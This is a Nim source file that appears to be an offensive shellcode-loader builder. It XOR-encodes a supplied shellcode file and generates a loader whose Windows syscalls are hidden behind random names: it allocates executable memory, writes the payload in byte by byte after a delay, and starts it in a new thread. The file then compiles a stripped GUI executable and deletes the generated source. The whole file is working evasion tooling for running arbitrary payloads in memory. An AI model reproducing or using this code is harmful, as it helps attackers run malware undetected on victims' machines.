import os, strformat, strutils, lib/sysrandom

proc mainCode(shellcode: string, key: string): string =
    let nimcall = "{.nimcall.}"
    result = &"""
include "lib/syscalls.nim"
var shellcode = {shellcode}
let key = {key}

proc run(buffer: pointer): DWORD =
  var function: proc ()
  function = cast[(proc(): void {nimcall})](buffer)
  function()

proc main() =
  let processID: DWORD = GetCurrentProcessId()
  var client_id: CLIENT_ID
  var obj_attr: OBJECT_ATTRIBUTES
  var process: HANDLE
  var tHandle: HANDLE
  var base_addr: LPVOID
  var psize: SIZE_T = cast[SIZE_T](shellcode.len)
  echo $processID
  client_id.UniqueProcess = cast[HANDLE](processID)
  #NtOpenProcess
  var status = RxkzcQmUAYLRVNPU(
      &process,
      PROCESS_ALL_ACCESS,
      &obj_attr, &client_id
  )
  #NtAllocateVirtualMemory
  status = jXqvrXZAnszpxgAQ(
      process, &base_addr, 0, &psize,
      MEM_COMMIT,
      PAGE_EXECUTE_READWRITE)

  var n: cint = 0
  #NtWriteVirtualMemory
  for i in 0..shellcode.len - 1:
    for k in 0..key.len - 1:
      shellcode[i] = shellcode[i] xor key[k]

    status = KgnsbNKJvLjCzCdw(
              process,
              cast[LPVOID](cast[ULONG_PTR](base_addr) + n),
              unsafeAddr shellcode[i],
              0x1,
              NULL)
    n += 1;
  Sleep(10000)
  #NtCreateThreadEx
  status = RgsaByzRzNoIffDM(
      &tHandle,
      THREAD_ALL_ACCESS,
      NULL,
      process,
      run,
      base_addr, FALSE, 0, 0, 0, NULL)
  WaitForSingleObject(tHandle, -1)
  #NtClose
  status = qTBdyplOmaCsBBJV(tHandle)
  status = qTBdyplOmaCsBBJV(process)

main()
"""


proc main() =
    defer: closeRandom()
    if(paramCount() != 2):
        echo fmt"[!] Usage: {paramStr(0)} -f shellcode.bin"
    var key = getRandomBytes(5)
    var file = open(paramStr(2), FileMode.fmRead)
    var mfile = open("main.nim", fmWrite)
    defer: file.close
    const BufSize = 1024
    var shellcode: array[BufSize, byte]
    var done = false
    var output: string = "[byte "
    var fmtkey: string = fmt"[byte {key[0]}, {key[1]}, {key[2]}, {key[3]}, {key[4]}]"
    while not done:
        let count = readBuffer(file, addr shellcode[0], BufSize)
        for i in 0..count - 1:
            for k in 0..key.len - 1:
                shellcode[i] = shellcode[i] xor key[k]
            if i == count - 1:
                output = output & $shellcode[i]
            else:
                output = output & $shellcode[i] & ","
        done = count == 0
    output = output & "]"
    mfile.write mainCode(output, fmtkey)
    mfile.close
    discard execShellCmd("nim c -d:mingw --cpu:amd64 --passL:-s --app:gui --gc:arc main.nim")
    removeFile("main.nim")

main()
